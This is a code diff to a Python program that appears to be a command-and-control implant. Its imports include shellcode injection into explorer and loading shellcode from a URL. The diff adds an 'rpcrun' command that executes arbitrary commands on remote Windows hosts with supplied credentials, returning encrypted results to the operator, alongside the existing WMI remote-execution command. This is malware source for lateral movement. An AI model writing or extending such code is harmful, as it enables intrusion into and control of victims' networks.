@@ -33,6 +33,7 @@ if os.name == 'nt':  # 'nt' indicates Windows
     from utils.winapi.cp import cp
     from utils.winapi.rm import rm
     from utils.winapi.wmirun import wmirun
+    from utils.winapi.rcprun import rpcrun
     from utils.winapi.inject_shellcode import load_shellcode_into_explorer
     from utils.winapi.load_shellcode_from_url import load_shellcode_from_url
     from utils.winapi.cd import cd
@@ -664,6 +665,26 @@ def execute_commands(agent_id):
                     domain = parts[5] if len(parts) > 5 else None
 
                     result = wmirun(remote_hostname, command, user, password, domain)
+                    status = 'Completed' if "Process started successfully" in result else 'Failed'
+                    output = result
+                except Exception as e:
+                    status = 'Failed'
+                    output = str(e)
+                update_command_status(command_id, status, encrypt_response(output, encryption_key), agent_id, ip, os_info, username)
+
+            elif os.name == 'nt' and command_text.lower().startswith('rpcrun'):
+                try:
+                    parts = command_text.split(' ', 4)
+                    if len(parts) < 3:
+                        raise ValueError("Invalid rpcrun command format. Use 'rpcrun <hostname> <command> [user password domain]'")
+
+                    remote_hostname = parts[1]
+                    command = parts[2]
+                    user = parts[3] if len(parts) > 3 else None
+                    password = parts[4] if len(parts) > 4 else None
+
+                    # Note: Domain is already included in the user if provided on the client side
+                    result = rpcrun(remote_hostname, command, user, password)
                     status = 'Completed' if "Process started successfully" in result else 'Failed'
                     output = result
                 except Exception as e:
